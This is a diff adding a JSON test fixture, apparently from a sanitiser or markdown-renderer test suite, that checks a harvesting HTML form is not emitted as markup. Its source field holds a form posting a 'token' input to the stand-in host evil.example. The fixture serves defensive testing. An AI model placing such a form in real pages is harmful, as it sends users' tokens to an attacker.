@@ -1,0 +1,8 @@
+{
+  "id": "html-form-action",
+  "category": "html",
+  "requirement": "PRD-15",
+  "status": "valid",
+  "source": "---\ntitle: T\n---\n\n<form action=\"https://evil.example/steal\"><input name=\"token\" value=\"x\"></form>\n",
+  "detail": "form/input pair harvesting fields: never emitted as markup"
+}
